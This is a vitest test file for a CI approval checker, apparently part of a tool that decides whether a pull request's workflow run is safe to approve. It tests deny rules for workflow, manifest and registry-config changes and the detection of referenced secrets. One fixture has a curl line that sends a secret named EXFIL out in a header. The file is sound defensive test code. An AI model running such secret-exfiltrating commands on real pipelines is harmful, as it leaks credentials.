import { describe, expect, it } from "vitest";

import {
  assessBlastRadius,
  referencedSecretNames,
  triggersOnPullRequest,
  type WorkflowSafetyProfile,
} from "../src/approval.js";

const SAFE_PROFILE: WorkflowSafetyProfile = {
  defaultWorkflowPermissions: "read",
  referencedSecrets: [],
};

const assess = (
  changedFilePaths: string[],
  profile: WorkflowSafetyProfile = SAFE_PROFILE,
  truncated = false,
) => assessBlastRadius({ changedFilePaths, truncated, profile });

describe("assessBlastRadius", () => {
  it("approves an ordinary source-and-test change in a read-only, secretless repo", () => {
    const verdict = assess(["src/parse.ts", "test/parse.test.ts"]);
    expect(verdict.safe).toBe(true);
    expect(verdict.blockers).toEqual([]);
    // The assurances are what gets written to the issue, so they must be
    // populated — an approval with no stated reasoning is not an audit trail.
    expect(verdict.assurances.length).toBeGreaterThan(0);
  });

  describe("changes that would let the diff redefine what CI executes", () => {
    it.each([
      [".github/workflows/ci.yml", "workflow definition"],
      [".github/workflows/nested/deploy.yaml", "workflow in a subdirectory"],
      [".github/actions/setup/action.yml", "composite action"],
      [".github/dependabot.yml", "other repository automation"],
      ["tools/my-action/action.yaml", "action definition outside .github"],
    ])("denies %s (%s)", (path) => {
      const verdict = assess(["src/ok.ts", path]);
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain(path);
    });

    it.each([
      "package.json",
      "package-lock.json",
      "yarn.lock",
      "pnpm-lock.yaml",
      "go.sum",
      "Cargo.lock",
      "requirements.txt",
    ])("denies dependency manifest %s", (path) => {
      // Installing dependencies runs their lifecycle scripts in CI, so a
      // manifest edit is arbitrary code execution regardless of the source diff.
      expect(assess(["src/ok.ts", path]).safe).toBe(false);
    });

    it("denies a manifest nested in a workspace package, not just at the root", () => {
      expect(assess(["packages/api/package.json"]).safe).toBe(false);
    });

    it.each([".npmrc", ".yarnrc.yml", "config/.pypirc"])(
      "denies registry configuration %s",
      (path) => {
        expect(assess([path]).safe).toBe(false);
      },
    );

    it("matches case-insensitively, since paths differ across platforms", () => {
      expect(assess([".GitHub/Workflows/CI.yml"]).safe).toBe(false);
      expect(assess(["Package.JSON"]).safe).toBe(false);
    });

    it("does not deny a source file that merely looks workflow-adjacent", () => {
      // Guards against an over-broad substring match: these are ordinary files.
      const verdict = assess([
        "src/workflows/engine.ts",
        "docs/package.json.md",
        "test/action.yml.test.ts",
      ]);
      expect(verdict.safe).toBe(true);
    });

    it("reports every offending path, not just the first", () => {
      const verdict = assess([
        ".github/workflows/ci.yml",
        "package.json",
        ".npmrc",
      ]);
      expect(verdict.blockers).toHaveLength(3);
    });
  });

  describe("what an approved run would be able to reach", () => {
    it("denies when workflow runs get a write-scoped token by default", () => {
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "write",
        referencedSecrets: [],
      });
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain("write");
    });

    it("denies when the token scope could not be determined", () => {
      // Fails closed: an unreadable setting is not evidence of a safe setting.
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "unknown",
        referencedSecrets: [],
      });
      expect(verdict.safe).toBe(false);
    });

    it("denies when a pull-request workflow references real secrets", () => {
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "read",
        referencedSecrets: ["NPM_TOKEN", "SLACK_WEBHOOK"],
      });
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain("NPM_TOKEN");
    });
  });

  describe("incomplete evidence", () => {
    it("denies a truncated file list even when nothing visible is dangerous", () => {
      // The workflow file could be on the page we did not see.
      const verdict = assess(["src/ok.ts"], SAFE_PROFILE, true);
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain("truncated");
    });

    it("denies an empty diff", () => {
      expect(assess([]).safe).toBe(false);
    });

    it("does not claim assurances it has not established", () => {
      const verdict = assess(["src/ok.ts"], SAFE_PROFILE, true);
      expect(verdict.assurances.join(" ")).not.toContain("changed path");
    });
  });
});

describe("referencedSecretNames", () => {
  it("finds dotted references", () => {
    expect(referencedSecretNames("token: ${{ secrets.NPM_TOKEN }}")).toEqual([
      "NPM_TOKEN",
    ]);
  });

  it("finds bracketed references", () => {
    expect(referencedSecretNames("${{ secrets['DEPLOY_KEY'] }}")).toEqual([
      "DEPLOY_KEY",
    ]);
  });

  it("ignores GITHUB_TOKEN, which is governed by the permissions check instead", () => {
    expect(referencedSecretNames("${{ secrets.GITHUB_TOKEN }}")).toEqual([]);
  });

  it("deduplicates and sorts", () => {
    const yaml = "${{ secrets.B }} ${{ secrets.A }} ${{ secrets.B }}";
    expect(referencedSecretNames(yaml)).toEqual(["A", "B"]);
  });

  it("finds a secret used inside a run block, where a YAML parse would hide it", () => {
    const yaml = ["    - run: |", "        curl -H \"$${{ secrets.EXFIL }}\" x"].join(
      "\n",
    );
    expect(referencedSecretNames(yaml)).toEqual(["EXFIL"]);
  });

  it("returns nothing for a workflow with no secrets", () => {
    expect(referencedSecretNames("on: pull_request\njobs:\n  t:\n    steps: []")).toEqual(
      [],
    );
  });
});

describe("triggersOnPullRequest", () => {
  it("detects a pull_request trigger", () => {
    expect(triggersOnPullRequest("on:\n  pull_request:\n    branches: [main]")).toBe(
      true,
    );
  });

  it("detects pull_request_target, which is the more dangerous variant", () => {
    expect(triggersOnPullRequest("on:\n  pull_request_target:")).toBe(true);
  });

  it("ignores a workflow that only runs on a schedule or release", () => {
    // Approving a PR run cannot start these, so their secrets are out of scope.
    expect(triggersOnPullRequest("on:\n  schedule:\n    - cron: '0 0 * * *'")).toBe(
      false,
    );
    expect(triggersOnPullRequest("on:\n  release:\n    types: [published]")).toBe(false);
  });
});
